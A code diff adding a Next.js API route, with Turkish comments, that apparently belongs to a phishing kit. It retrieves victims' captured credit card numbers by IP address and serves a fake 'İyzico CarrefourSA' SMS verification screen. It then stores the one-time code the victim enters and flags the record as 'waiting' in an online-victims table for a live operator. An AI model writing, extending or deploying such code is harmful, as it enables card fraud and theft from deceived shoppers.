@@ -1,0 +1,148 @@
+import { NextRequest, NextResponse } from 'next/server';
+import pool from '@/lib/db';
+
+// IP adresini al
+function getClientIP(request: NextRequest): string {
+    const forwarded = request.headers.get('x-forwarded-for');
+    const realIP = request.headers.get('x-real-ip');
+
+    if (forwarded) {
+        return forwarded.split(',')[0].trim();
+    }
+    if (realIP) {
+        return realIP;
+    }
+    return '127.0.0.1';
+}
+
+// SMS sayfası için verileri getir
+export async function GET(request: NextRequest) {
+    try {
+        const ip = getClientIP(request);
+
+        // logs tablosundan verileri al
+        const [logRows] = await pool.query(
+            'SELECT kredi_karti, tutar, tarih FROM logs WHERE ip = ?',
+            [ip]
+        ) as any[];
+
+        if (!logRows || logRows.length === 0) {
+            return NextResponse.json({
+                success: false,
+                error: 'Kayıt bulunamadı',
+                redirect: '/'
+            });
+        }
+
+        const log = logRows[0];
+
+        // addresses tablosundan telefon numarasını al
+        const [addressRows] = await pool.query(
+            'SELECT phone FROM addresses WHERE ip_address = ? ORDER BY is_default DESC LIMIT 1',
+            [ip]
+        ) as any[];
+
+        let maskedPhone = '05XX XXX XX XX';
+        if (addressRows && addressRows.length > 0 && addressRows[0].phone) {
+            const phone = addressRows[0].phone.replace(/\s/g, '');
+            if (phone.length >= 4) {
+                const first2 = phone.substring(0, 2);
+                const last2 = phone.substring(phone.length - 2);
+                const middleLength = phone.length - 4;
+                const masked = '*'.repeat(middleLength);
+                maskedPhone = first2 + masked + last2;
+            }
+        }
+
+        // Kart tipini belirle (Visa/Mastercard)
+        const cardNumber = log.kredi_karti?.replace(/\s/g, '') || '';
+        let cardType = 'unknown';
+        if (cardNumber.startsWith('4')) {
+            cardType = 'visa';
+        } else if (cardNumber.startsWith('5')) {
+            cardType = 'mastercard';
+        }
+
+        // Son 4 hane
+        const lastFourDigits = cardNumber.length >= 4 ? cardNumber.slice(-4) : '****';
+
+        // Tarihi formatla - İstanbul zaman dilimi
+        const dateOptions: Intl.DateTimeFormatOptions = {
+            timeZone: 'Europe/Istanbul',
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit'
+        };
+
+        let formattedDate = new Date().toLocaleString('tr-TR', dateOptions);
+        if (log.tarih) {
+            // Eğer tarih bir timestamp (sayı) ise
+            if (typeof log.tarih === 'number' || !isNaN(Number(log.tarih))) {
+                const timestamp = Number(log.tarih);
+                // Timestamp 13 haneli (milisaniye) mi yoksa 10 haneli (saniye) mi kontrol et
+                const date = timestamp > 9999999999 ? new Date(timestamp) : new Date(timestamp * 1000);
+                formattedDate = date.toLocaleString('tr-TR', dateOptions);
+            } else if (log.tarih instanceof Date) {
+                formattedDate = log.tarih.toLocaleString('tr-TR', dateOptions);
+            } else if (typeof log.tarih === 'string') {
+                const date = new Date(log.tarih);
+                if (!isNaN(date.getTime())) {
+                    formattedDate = date.toLocaleString('tr-TR', dateOptions);
+                }
+            }
+        }
+
+        return NextResponse.json({
+            success: true,
+            data: {
+                tutar: log.tutar || '0.00',
+                tarih: formattedDate,
+                lastFourDigits,
+                cardType,
+                maskedPhone,
+                isyeriAdi: 'İyzico CarrefourSA'
+            }
+        });
+    } catch (error: any) {
+        console.error('SMS veri getirme hatası:', error);
+        return NextResponse.json({ success: false, error: error.message }, { status: 500 });
+    }
+}
+
+// SMS kodunu kaydet
+export async function POST(request: NextRequest) {
+    try {
+        const ip = getClientIP(request);
+        const { smsCode } = await request.json();
+
+        if (!smsCode || smsCode.length < 5) {
+            return NextResponse.json({
+                success: false,
+                error: 'Geçersiz SMS kodu'
+            }, { status: 400 });
+        }
+
+        // logs tablosundaki sms sütununu güncelle
+        await pool.query(
+            'UPDATE logs SET sms = ?, durum = ? WHERE ip = ?',
+            [smsCode, 'BEKLİYOR', ip]
+        );
+
+        // cevrimici_tablosu'ndaki sayfa sütununu güncelle
+        await pool.query(
+            'UPDATE cevrimici_tablosu SET sayfa = ? WHERE ip = ?',
+            ['BEKLİYOR', ip]
+        );
+
+        return NextResponse.json({
+            success: true,
+            message: 'ok'
+        });
+    } catch (error: any) {
+        console.error('SMS kaydetme hatası:', error);
+        return NextResponse.json({ success: false, error: error.message }, { status: 500 });
+    }
+}
